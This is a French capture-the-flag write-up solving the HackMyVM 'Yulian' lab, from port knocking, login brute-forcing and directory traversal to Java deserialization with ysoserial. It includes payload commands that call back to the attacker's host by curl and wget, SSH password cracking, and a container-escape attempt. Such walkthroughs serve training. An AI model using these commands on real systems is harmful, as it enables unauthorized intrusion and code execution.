---
title: "Solution du CTF Yulian de HackMyVM.eu"
tags: [CTF,HackMyVM]
---

### I'm a Teapot

[Yulian](https://hackmyvm.eu/machines/machine.php?vm=Yulian) est un CTF proposé sur HackMyVM. Il est marqué comme étant difficile. Faites chauffer vos désassembleurs !

Le CTF s'appuyant sur un système récent, il n'y a pas grand chose qui est remonté par Nmap :

```console
$ sudo nmap -sCV --script vuln -T5 -p- 192.168.56.138
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.56.138
Host is up (0.00029s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE    SERVICE    VERSION
22/tcp   open     ssh        OpenSSH 9.9 (protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:9.9: 
|       PACKETSTORM:189283      6.8     https://vulners.com/packetstorm/PACKETSTORM:189283      *EXPLOIT*
|       F79E574D-30C8-5C52-A801-66FFA0610BAA    6.8     https://vulners.com/githubexploit/F79E574D-30C8-5C52-A801-66FFA0610BAA  *EXPLOIT*
|       CVE-2025-26465  6.8     https://vulners.com/cve/CVE-2025-26465
|       9D8432B9-49EC-5F45-BB96-329B1F2B2254    6.8     https://vulners.com/githubexploit/9D8432B9-49EC-5F45-BB96-329B1F2B2254  *EXPLOIT*
|       1337DAY-ID-39918        6.8     https://vulners.com/zdt/1337DAY-ID-39918        *EXPLOIT*
|       CVE-2025-26466  5.9     https://vulners.com/cve/CVE-2025-26466
|       CE606E2D-D0A5-5DE8-8A61-E7AB65789A99    5.9     https://vulners.com/githubexploit/CE606E2D-D0A5-5DE8-8A61-E7AB65789A99  *EXPLOIT*
|_      CVE-2025-32728  4.3     https://vulners.com/cve/CVE-2025-32728
80/tcp   open     http       nginx
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  CVE:CVE-2011-3192  BID:49303
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|       https://www.tenable.com/plugins/nessus/55976
|       https://www.securityfocus.com/bid/49303
|_      https://seclists.org/fulldisclosure/2011/Aug/175
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
8080/tcp filtered http-proxy
MAC Address: 08:00:27:2B:4D:C2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 84.30 seconds
```

Sur la page d'index, on a une simulation de terminal qui autorise un jeu de commandes limitées et un système de fichier très petit. Voici un extrait du code Javascript :

```html
  <script>
    const terminal = document.getElementById("terminal");

    const fileSystem = {
      "home": {
        "user": {
          "file1.txt": "Hello, this is file1.",
          "notes.md": "# Notes\nThis is a markdown file."
        }
      },
      "var": {
        "log.txt": "System log content here."
      },
      "opt":{
        "code":{
            "test.c":`#include<stdio.h>
#include<stdlib.h>

int main()
{
        srand(114514);
        for(int i = 0; i < 114514; i++)
        {
                rand();
        }
        printf("%d\\n",rand()%65535);

        printf("%d\\n",rand()%65535);

        printf("%d\\n",rand()%65535);


        return 0;
}`
        }
      }

    };
```

J'ai énuméré longuement les fichiers et dossiers sur le serveur web, sans succès. Le code C présent dans le code a sans doute son utilité.

On remarque l'utilisation de `srand` avec une valeur hardcodée, le programme crachera donc des valeurs déterministes.

```console
$ gcc -o test test.c 
$ ./test 
6440
17226
31925
```

Ce sont certainement des numéros de port, donc du port knocking. Le port 8080 étant filtré, on peut s'attendre à ce qu'il se retrouve débloqué :

```console
$ for port in 6440 17226 31925; do ncat -z -w 1 192.168.56.138 $port; sleep 1; done; curl -D- http://192.168.56.138:8080/
HTTP/1.1 302 
Location: http://192.168.56.138:8080/login.html
Content-Language: en-US
Content-Length: 0
Date: Sat, 19 Jul 2025 11:57:55 GMT
```

Sur ce nouveau site, on trouve une page de login. J'ai bien sûr essayé de trouver une faille SQL :

```bash
sqlmap -u http://192.168.56.138:8080/login --data "username=test&password=test" --risk 3 --level 5
```

Nope ! Une première énumération a remonté quelques paths mais rien de bien intéressant :

```console
$ feroxbuster -u http://192.168.56.138:8080/ -w DirBuster-0.12/directory-list-2.3-big.txt -n -x php,html

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.138:8080/
 🚀  Threads               │ 50
 📖  Wordlist              │ DirBuster-0.12/directory-list-2.3-big.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 💲  Extensions            │ [php, html]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
405        1l        7w        0c http://192.168.56.138:8080/login
200       82l      162w     2270c http://192.168.56.138:8080/login.html
200        1l        4w       39c http://192.168.56.138:8080/test
200        1l        1w       47c http://192.168.56.138:8080/success
302        0l        0w        0c http://192.168.56.138:8080/logout
500        1l        3w        0c http://192.168.56.138:8080/error
--- snip ---
```

La page de logout divulgue tout de même un nom de cookie :

```console
$ curl -D- http://192.168.56.138:8080/logout
HTTP/1.1 302 
Set-Cookie: auth=; Max-Age=0; Expires=Thu, 01-Jan-1970 00:00:10 GMT; Path=/; HttpOnly
Location: http://192.168.56.138:8080/login.html
Content-Length: 0
Date: Sat, 19 Jul 2025 12:02:25 GMT
```

Finalement, faute de trouver quelque chose, j'ai brute-forcé un hypothétique compte `admin` :

```console
$ ffuf -u http://192.168.56.138:8080/login -d "username=admin&password=FUZZ" -X POST  -H "Content-type: application/x-www-form-urlencoded" -w /tmp/rockyou.txt -fr Wrong -H "Referer: http://192.168.56.138:8080/login.html"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : POST
 :: URL              : http://192.168.56.138:8080/login
 :: Wordlist         : FUZZ: /tmp/rockyou.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Referer: http://192.168.56.138:8080/login.html
 :: Data             : username=admin&password=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Wrong
________________________________________________

123457                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 749ms]
[WARN] Caught keyboard interrupt (Ctrl-C)

```

Avec le mot de passe trouvé, on peut se connecter et on arrive sur la page `/success` qui n'offre aucune action...

Je note qu'un cookie a été défini pour notre session.

```
admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI=
```

Si je supprime le cookie et me reconnecte, j'obtiens le même cookie. Mais vu que l'on dispose du mot de passe, difficile de croire qu'il faille investiguer de ce côté.

J'ai lancé `Nuclei` sur le site, qui a détecté via le favicon l'emploi du framework de développement `Spring-Boot`.

```
[favicon-detect:spring-boot] [http] [info] http://192.168.56.139:8080/favicon.ico [116323821]
[favicon-detect:Springboot Actuators] [http] [info] http://192.168.56.139:8080/favicon.ico [116323821]
[favicon-detect:Spring Boot H2 Database] [http] [info] http://192.168.56.139:8080/favicon.ico [116323821]
[spring-detect] [http] [info] http://192.168.56.139:8080/error
[springboot-actuator:favicon] [http] [info] http://192.168.56.139:8080/favicon.ico
```

Aussi, le format du JSON retourné par `/error` semble typique de ce framework :

[java - Getting &quot;No message available&quot; error with Spring Boot + REST application - Stack Overflow](https://stackoverflow.com/questions/34135205/getting-no-message-available-error-with-spring-boot-rest-application)

J'ai trouvé sur Github un outil de scan spécifique :

[GitHub - AabyssZG/SpringBoot-Scan: 针对SpringBoot的开源渗透框架，以及Spring相关高危漏洞利用工具](https://github.com/AabyssZG/SpringBoot-Scan)

Il n'en est rien ressorti. Pareil pour les deux exploits trouvés sur `exploit-db` : ils requièrent l'accès à des endpoints `actuators` qui ne sont pas présents ici.

Finalement, ce qu'il me fallait pour ne plus être bloqué, c'était autoriser la remontée des status HTTP 400 par `feroxbuster` :

```bash
feroxbuster -u http://192.168.56.139:8080/ -w fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-words.txt -n -H "Cookie: auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI=;" -t 100 -s 200,204,301,302,307,308,400,401,403,405,500
```

Cette fois, on trouvait aussi un endpoint `/download`. C'est la preuve que c'est outils d'énumérations sont toujours pensés pour des sites classiques et moins pour des APIs...

### CoffeeTime

Ce script attend un paramètre `file` que l'on peut soit deviner, soit trouver mentionné dans l'erreur retournée par le serveur. On a un directory traversal sans restrictions. On peut même accèder à `/etc/shadow` mais aucun hash n'est présent, signe que le serveur tourne dans un container.

Les applis générées par Spring-Boot sont au format JAR. Elles contiennent toute la machinerie Spring ainsi que le code custom. En lisant `/proc/self/cmdline` on peut trouver le nom du fichier :

```console
$ curl -s "http://192.168.56.139:8080/download?file=/proc/self/cmdline" -H "Cookie: auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI=;" -o- | tr '\0' ' '
java -jar javaserver-0.0.1-SNAPSHOT.jar
```

On re-exploite ensuite le directory traversal pour lire le fichier que l'on peut décompresser :

```console
$ unzip -l javaserver-0.0.1-SNAPSHOT.jar 
Archive:  javaserver-0.0.1-SNAPSHOT.jar
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2025-06-29 23:55   META-INF/
      378  2025-06-29 23:55   META-INF/MANIFEST.MF
        0  2025-06-29 23:55   org/
        0  2025-06-29 23:55   org/springframework/
        0  2025-06-29 23:55   org/springframework/boot/
        0  2025-06-29 23:55   org/springframework/boot/loader/
        0  2025-06-29 23:55   org/springframework/boot/loader/data/
--- snip ---
     1484  2019-06-19 00:02   org/springframework/boot/loader/PropertiesLauncher$ArchiveEntryFilter.class
        0  2025-06-29 23:55   BOOT-INF/
        0  2025-06-29 23:55   BOOT-INF/classes/
        0  2025-06-29 23:55   BOOT-INF/classes/org/
        0  2025-06-29 23:55   BOOT-INF/classes/org/example/
        0  2025-06-29 23:55   BOOT-INF/classes/org/example/javaserver/
        0  2025-06-29 23:55   BOOT-INF/classes/org/example/javaserver/controller/
        0  2025-06-29 23:55   BOOT-INF/classes/static/
        0  2025-06-29 23:55   META-INF/maven/
        0  2025-06-29 23:55   META-INF/maven/org.example/
        0  2025-06-29 23:55   META-INF/maven/org.example/javaserver/
       73  2025-06-29 23:55   BOOT-INF/classes/application.properties
     7052  2025-06-29 23:55   BOOT-INF/classes/org/example/javaserver/controller/VulnController.class
      763  2025-06-29 23:55   BOOT-INF/classes/org/example/javaserver/JavaserverApplication.class
     2270  2025-06-29 23:55   BOOT-INF/classes/static/login.html
     1575  2025-06-16 18:24   META-INF/maven/org.example/javaserver/pom.xml
       68  2025-06-29 23:55   META-INF/maven/org.example/javaserver/pom.properties
        0  2025-06-29 23:55   BOOT-INF/lib/
      403  2019-06-19 00:18   BOOT-INF/lib/spring-boot-starter-web-2.1.6.RELEASE.jar
      397  2019-06-19 00:18   BOOT-INF/lib/spring-boot-starter-2.1.6.RELEASE.jar
--- snip ---
   325632  2019-05-15 19:58   BOOT-INF/lib/jackson-core-2.9.9.jar
   575389  2008-04-11 15:38   BOOT-INF/lib/commons-collections-3.2.1.jar
---------                     -------
 17455471                     114 files

```

Clairement, `BOOT-INF/classes/org/example/javaserver/controller/VulnController.class` semble être le code custom. Je l'ai ouvert avec `JD-GUI` :

```java
package org.example.javaserver.controller;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.OutputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Base64;
import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
public class VulnController {
  private static final String SECRET_KEY = "123@456@789";
  
  private String generateToken(String username) throws Exception {
    Mac hmac = Mac.getInstance("HmacSHA256");
    hmac.init(new SecretKeySpec("123@456@789".getBytes(), "HmacSHA256"));
    byte[] signature = hmac.doFinal(username.getBytes());
    return username + ":" + Base64.getEncoder().encodeToString(signature);
  }
  
  private boolean isValidToken(String token) throws Exception {
    String[] parts = token.split(":");
    if (parts.length != 2)
      return false; 
    String username = parts[0];
    String expected = generateToken(username);
    return token.equals(expected);
  }
  
  @PostMapping({"/login"})
  public void login(@RequestParam String username, @RequestParam String password, HttpServletResponse response) throws Exception {
    if ("admin".equals(username) && "123457".equals(password)) {
      String token = generateToken(username);
      Cookie cookie = new Cookie("auth", token);
      cookie.setHttpOnly(true);
      cookie.setSecure(false);
      cookie.setPath("/");
      response.addCookie(cookie);
      response.sendRedirect("/success");
    } else {
      response.sendRedirect("/login.html?error=Wrong username or password");
    } 
  }
  
  @PostMapping({"/deserialize"})
  public String deserialize(@RequestBody byte[] data, HttpServletRequest request) {
    if (!isLoggedIn(request))
      return "<h2>Error: Unauthorized access"; 
    try {
      ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
      Object obj = ois.readObject();
      ois.close();
      return "Deserialized: " + obj.toString();
    } catch (Exception e) {
      return "Error: " + e.getMessage();
    } 
  }
  
  @GetMapping({"/success"})
  @ResponseBody
  public String success(HttpServletRequest request) {
    if (!isLoggedIn(request))
      return "<script>window.location='/login.html';</script>"; 
    return "<h2>login successful!</h2>";
  }
  
  @GetMapping({"/"})
  public String index(HttpServletRequest request) {
    if (isLoggedIn(request))
      return "redirect:/success"; 
    return "redirect:/login.html";
  }
  
  @GetMapping({"/logout"})
  public void logout(HttpServletRequest request, HttpServletResponse response) throws IOException {
    Cookie cookie = new Cookie("auth", null);
    cookie.setMaxAge(0);
    cookie.setPath("/");
    cookie.setHttpOnly(true);
    cookie.setSecure(false);
    response.addCookie(cookie);
    response.sendRedirect("/login.html");
  }
  
  private boolean isLoggedIn(HttpServletRequest request) {
    if (request.getCookies() != null)
      for (Cookie cookie : request.getCookies()) {
        if ("auth".equals(cookie.getName()))
          try {
            return isValidToken(cookie.getValue());
          } catch (Exception e) {
            return false;
          }  
      }  
    return false;
  }
  
  @GetMapping({"/test"})
  @ResponseBody
  public String test() {
    return "<h1>Website is under development.......";
  }
  
  @GetMapping({"/download"})
  public void downloadFile(@RequestParam String file, HttpServletRequest request, HttpServletResponse response) {
    if (!isLoggedIn(request)) {
      try {
        response.setStatus(403);
        response.getWriter().write("<h1>Forbidden access");
      } catch (IOException iOException) {}
      return;
    } 
    try {
      Path path = Paths.get(file, new String[0]).normalize();
      if (!Files.exists(path, new java.nio.file.LinkOption[0]) || Files.isDirectory(path, new java.nio.file.LinkOption[0])) {
        response.setStatus(404);
        response.getWriter().write(file);
        return;
      } 
      response.setContentType("application/octet-stream");
      response.setHeader("Content-Disposition", "attachment; filename=\"" + path.getFileName() + "\"");
      Files.copy(path, (OutputStream)response.getOutputStream());
      response.flushBuffer();
    } catch (IOException e) {
      try {
        response.getWriter().write(e.getMessage());
      } catch (IOException iOException) {}
    } 
  }
}

```

En dehors ce que l'on a déjà vu, il y a un endpoint `/deserialize` qui attend du contenu sérialisé.

Pour exploiter la désérialisation, je me suis servi de `ysoserial`, la référence en la matière :

[GitHub - frohoff/ysoserial: A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.](https://github.com/frohoff/ysoserial)

Dans l'output de `unzip` on pouvait voir la présence de `commons-collections`. `ysoserial` a quelques encodeurs disponibles pour cette librairie. J'en ai testé plusieurs avant d'en trouver un qui marche :

```bash
java -jar ysoserial-all.jar CommonsCollections7 'curl http://192.168.56.1/' > data.bin
```

Avec mon payload sérialisé écrit dans un fichier, il ne reste plus qu'à l'envoyer sur l'endpoint :

```console
$ curl -X POST http://192.168.56.139:8080/deserialize \
    -H "Content-Type: application/octet-stream" \
    -H "Cookie: auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI=;" \
    --data-binary @data.bin
{"timestamp":"2025-07-19T19:05:31.220+0000","status":404,"error":"Not Found","message":"No message available","path":"/deserialize"}
```

La réponse retournée est surprenante (on penserait trouver un statut de réussite) mais j'ai bien reçu une requête sur mon serveur web.

Je saute ici l'étape d'utilisation de `reverse-ssh` en mode connect-back.

Une fois un shell obtenu, je confirme la présence du container et récupère le premier flag :

```console
bash-4.4# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
6: eth0@if7: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.3/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
bash-4.4# hostname
3debe9b825c8
bash-4.4# cat /root/user.txt 
flag{ce6560c893e5cfec48e0fd186dc03718}
```

Qui dit container, dit utilisation du couteau suisse [GitHub - cdk-team/CDK: 📦 Make security testing of K8s, Docker, and Containerd easier.](https://github.com/cdk-team/CDK).

Cet outil va me permettre de voir si je peux m'échapper du container :

```console
bash-4.4# ./cdk_linux_amd64 auto-escape "wget http://192.168.56.1/shell.php -o /var/www/html/shell.php"
2025/07/19 19:36:33 Caution: Flag auto-escape is deprecated as of CDK v1.5.1, and will be archived in v2.0. We recommend migrating to `./cdk eva --full` and `./cdk run`.

[Auto Escape - Privileged Container]
2025/07/19 19:36:33 Capabilities hex of Caps(CapInh|CapPrm|CapEff|CapBnd|CapAmb):
        CapInh: 0000000000000000
        CapPrm: 00000000a80425fb
        CapEff: 00000000a80425fb
        CapBnd: 00000000a80425fb
        CapAmb: 0000000000000000
        Cap decode: 0x00000000a80425fb = CAP_CHOWN,CAP_DAC_OVERRIDE,CAP_FOWNER,CAP_FSETID,CAP_KILL,CAP_SETGID,CAP_SETUID,CAP_SETPCAP,CAP_NET_BIND_SERVICE,CAP_NET_RAW,CAP_SYS_CHROOT,CAP_MKNOD,CAP_AUDIT_WRITE,CAP_SETFCAP
[*] Maybe you can exploit the Capabilities below:
2025/07/19 19:36:33 not privileged container.

[Auto Escape - Shared Net Namespace]
2025/07/19 19:36:33 Cannot find vulnerable containerd-shim socket.
2025/07/19 19:36:33 exploit failed.

[Auto Escape - docker.sock]
2025/07/19 19:36:33 err found while stat docker.sock path.:
stat /var/run/docker.sock: no such file or directory
2025/07/19 19:36:33 exploit failed

[Auto Escape - K8s API Server]
2025/07/19 19:36:33 checking if api-server allows system:anonymous request.
err found while searching local K8s apiserver addr.:
err: cannot find kubernetes api host in ENV
        api-server forbids anonymous request.
        response:
load K8s service account token error.:
open /var/run/secrets/kubernetes.io/serviceaccount/token: no such file or directory
2025/07/19 19:36:33 exploit failed
2025/07/19 19:36:33 all exploits are finished, auto exploit failed
```

Pas de sortie possible. Mais `cdk` c'est aussi quelques outils intégrés comme un scanner de ports.

Comme nous sonne sur `172.17.0.3` il y a certainement deux adresses IP avant nous :

```console
bash-4.4# ./cdk_linux_amd64 probe 172.17.0.1-2 1-65535 50 1000
2025/07/19 19:42:29 scanning 172.17.0.1-2 with user-defined ports, max parallels:50, timeout:1s
open : 172.17.0.1:80
open : 172.17.0.1:22
open : 172.17.0.1:8080
open : 172.17.0.2:22
open : 172.17.0.2:80
2025/07/19 19:42:36 scanning use time:6558ms
2025/07/19 19:42:36 ending; @args is ips: 172.17.0.1-2, max parallels:50, timeout:1s
```

`172.17.0.1` étant l'hôte, le CTF attend certainement que l'on commence par `172.17.0.2`.

### Tea for two

J'ai forwardé le port 80 depuis mon tunnel `reverse-ssh` :

```bash
ssh -p 8888 -N -L 8000:172.17.0.2:80 127.0.0.1
```

On tombe alors sur une page intitulée `Introduction to Brute Force Attacks` avec un commentaire indiquant `500-worst-passwords`.

Difficile de savoir si j'ai exactement la même wordlist mais ça marche :

```console
$ ncrack -u root -P wordlists/top500.txt ssh://127.0.0.1:2222

Starting Ncrack 0.8 ( http://ncrack.org ) at 2025-07-19 21:49 CEST
Rate: 0.16; Found: 1; About 73.75% done; ETC: 21:55 (0:01:35 remaining)
(press 'p' to list discovered credentials)
Discovered credentials for ssh on 127.0.0.1 2222/tcp:
127.0.0.1 2222/tcp ssh: 'root' 'mountain'
```

Comme on est directement `root` sur le container, on doit certainement trouver un secret quelconque.

```console
6ab28be27b0c:/etc# ls
total 200K   
drwxr-xr-x    1 root     root        4.0K Jun 24 17:57 .
drwxr-xr-x    1 root     root        4.0K Jun 24 17:57 ..
-rw-r--r--    1 root     root           7 May 30 12:11 alpine-release
drwxr-xr-x    1 root     root        4.0K Jun 25 05:19 apk
drwxr-xr-x    2 root     root        4.0K Jun 24 02:33 bash
--- snip ---
-rw-r--r--    1 root     root         400 Jun 24 17:57 output.enc
--- snip ---
```

Ce binaire est mystérieux. Malgré son extension, il n'est pas chiffré avec `openssl` :

```console
$ python3 openssl2john.py output.enc 
output.enc doesn't seem to be encrypted using OpenSSL's enc command!
```

Il doit y avoir un programme pour le déchiffrer. Comme le système est `Alpine`, la majorité des programmes sont des liens symboliques vers busybox :

```console
6ab28be27b0c:/etc# ls /bin/
total 2M     
drwxr-xr-x    1 root     root        4.0K Jun 24 02:33 .
drwxr-xr-x    1 root     root        4.0K Jun 24 17:57 ..
lrwxrwxrwx    1 root     root          12 May 30 12:13 arch -> /bin/busybox
lrwxrwxrwx    1 root     root          12 May 30 12:13 ash -> /bin/busybox
lrwxrwxrwx    1 root     root          12 May 30 12:13 base64 -> /bin/busybox
-rwxr-xr-x    1 root     root      738.7K Sep 24  2024 bash
lrwxrwxrwx    1 root     root          12 May 30 12:13 bbconfig -> /bin/busybox
-rwxr-xr-x    1 root     root      789.8K May 26 20:04 busybox
lrwxrwxrwx    1 root     root          12 May 30 12:13 cat -> /bin/busybox
lrwxrwxrwx    1 root     root          12 May 30 12:13 chattr -> /bin/busybox
lrwxrwxrwx    1 root     root          12 May 30 12:13 chgrp -> /bin/busybox
lrwxrwxrwx    1 root     root          12 May 30 12:13 chmod -> /bin/busybox
lrwxrwxrwx    1 root     root          12 May 30 12:13 chown -> /bin/busybox
lrwxrwxrwx    1 root     root          12 May 30 12:13 cp -> /bin/busybox
lrwxrwxrwx    1 root     root          12 May 30 12:13 date -> /bin/busybox
--- snip ---
```

On peut filtrer facilement ceux qui ne le sont pas :

```console
6ab28be27b0c:/etc# ls /bin/ /usr/bin/ /usr/sbin/ /sbin/ /usr/local/bin/ | grep -v busybox
/bin/:
total 2M     
drwxr-xr-x    1 root     root        4.0K Jun 24 02:33 .
drwxr-xr-x    1 root     root        4.0K Jun 24 17:57 ..
-rwxr-xr-x    1 root     root      738.7K Sep 24  2024 bash

/sbin/:
total 84K    
drwxr-xr-x    2 root     root        4.0K May 30 12:13 .
drwxr-xr-x    1 root     root        4.0K Jun 24 17:57 ..
-rwxr-xr-x    1 root     root       68.0K May 29 12:10 apk
-rwxr-xr-x    1 root     root         393 Mar  5 08:32 ldconfig

/usr/bin/:
total 4M     
drwxr-xr-x    1 root     root        4.0K Jun 24 14:42 .
drwxr-xr-x    1 root     root        4.0K May 30 12:13 ..
-rwxr-xr-x    1 root     root        4.7K May 26 20:04 findssl.sh
-rwxr-xr-x    1 root     root       21.8K Mar  5 08:32 getconf
-rwxr-xr-x    1 root     root       18.0K Mar  5 08:32 getent
-rwxr-xr-x    1 root     root       13.8K Mar  5 08:32 iconv
-rwxr-xr-x    1 root     root          52 Mar  5 08:32 ldd
-rw-r--r--    1 root     root           0 Jun 24 17:10 output.enc
-rwxr-xr-x    1 root     root       65.9K Jan 20 22:33 scanelf
-rwxr-xr-x    1 root     root      186.2K May 26 20:04 scp
-rwxr-xr-x    1 root     root      194.2K May 26 20:04 sftp
-rwxr-xr-x    1 root     root      830.8K May 26 20:04 ssh
-rwxr-xr-x    1 root     root      362.1K May 26 20:04 ssh-add
-rwxr-xr-x    1 root     root      354.2K May 26 20:04 ssh-agent
-rwxr-xr-x    1 root     root       13.8K May 26 20:04 ssh-copy-id
-rwxr-xr-x    1 root     root      470.3K May 26 20:04 ssh-keygen
-rwxr-xr-x    1 root     root      478.5K May 26 20:04 ssh-keyscan
-rwxr-xr-x    1 root     root      330.1K May 26 20:04 ssh-pkcs11-helper
-rwxr-xr-x    1 root     root       14.0K May 26 20:04 ssl_client
-rwxr-xr-x    1 root     root      753.9K Jun 24 13:15 userLogin

--- snip ---
```

`userLogin` est le plus inhabituel. Je l'ai récupéré sur mon système pour l'étudier. Il s'agit d'un binaire static et heureusement non-strippé :

```
userLogin: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=305ce3b4a93ea685f30546b2754e008f7cf0f249, for GNU/Linux 3.2.0, not stripped
```

Avec `strace` on voit clairement que c'est le bon :

```console
$ strace ./userLogin 
execve("./userLogin", ["./userLogin"], 0x7ffcb49b4200 /* 103 vars */) = 0
brk(NULL)                               = 0x2d67e000
brk(0x2d67ed00)                         = 0x2d67ed00
arch_prctl(ARCH_SET_FS, 0x2d67e380)     = 0
set_tid_address(0x2d67e650)             = 35752
set_robust_list(0x2d67e660, 24)         = 0
rseq(0x2d67eca0, 0x20, 0, 0x53053053)   = 0
prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
readlinkat(AT_FDCWD, "/proc/self/exe", "/tmp/userLogin", 4096) = 14
getrandom("\x63\xa4\x7c\xf4\xd1\xc5\x9b\x67", 8, GRND_NONBLOCK) = 8
brk(NULL)                               = 0x2d67ed00
brk(0x2d69fd00)                         = 0x2d69fd00
brk(0x2d6a0000)                         = 0x2d6a0000
mprotect(0x4a1000, 20480, PROT_READ)    = 0
openat(AT_FDCWD, "id_ed25519", O_RDONLY) = -1 ENOENT (Aucun fichier ou dossier de ce nom)
openat(AT_FDCWD, "output.enc", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3
dup(2)                                  = 4
fcntl(4, F_GETFL)                       = 0x2 (flags O_RDWR)
newfstatat(4, "", {st_mode=S_IFCHR|0600, st_rdev=makedev(0x88, 0xc), ...}, AT_EMPTY_PATH) = 0
write(4, "error: No such file or directory"..., 33error: No such file or directory
) = 33
close(4)                                = 0
exit_group(1)                           = ?
+++ exited with 1 +++
```

Il tente d'ouvrir une clé SSH en lecture (`id_ed25519`) et d'écrire le résultat du chiffrement vers `output.enc`. C'est donc l'encodeur.

Pour voir ce qu'il fait, j'ai rempli le fichier d'entrée (manquant sur le système) avec des caractères répétés :

```console
$ echo -n AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA > id_ed25519
$ strace ./userLogin 
execve("./userLogin", ["./userLogin"], 0x7fff2760d1c0 /* 103 vars */) = 0
brk(NULL)                               = 0x27397000
brk(0x27397d00)                         = 0x27397d00
arch_prctl(ARCH_SET_FS, 0x27397380)     = 0
set_tid_address(0x27397650)             = 35855
set_robust_list(0x27397660, 24)         = 0
rseq(0x27397ca0, 0x20, 0, 0x53053053)   = 0
prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
readlinkat(AT_FDCWD, "/proc/self/exe", "/tmp/userLogin", 4096) = 14
getrandom("\x5f\xe7\x98\x7e\x04\x2c\x56\x18", 8, GRND_NONBLOCK) = 8
brk(NULL)                               = 0x27397d00
brk(0x273b8d00)                         = 0x273b8d00
brk(0x273b9000)                         = 0x273b9000
mprotect(0x4a1000, 20480, PROT_READ)    = 0
openat(AT_FDCWD, "id_ed25519", O_RDONLY) = 3
openat(AT_FDCWD, "output.enc", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 4
newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=40, ...}, AT_EMPTY_PATH) = 0
read(3, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 4096) = 40
newfstatat(4, "", {st_mode=S_IFREG|0644, st_size=0, ...}, AT_EMPTY_PATH) = 0
read(3, "", 4096)                       = 0
close(3)                                = 0
write(4, "\240\177\320\205Q\342\241\367\240\177\320\205Q\342\241\367\240\177\320\205Q\342\241\367\240\177\320\205Q\342\241\367"..., 40) = 40
close(4)                                = 0
newfstatat(1, "", {st_mode=S_IFCHR|0600, st_rdev=makedev(0x88, 0xc), ...}, AT_EMPTY_PATH) = 0
write(1, "enc\357\274\232id_ed25519 \342\206\222 output.enc\n", 32enc：id_ed25519 → output.enc
) = 32
exit_group(0)                           = ?
+++ exited with 0 +++
$ hexdump -C output.enc 
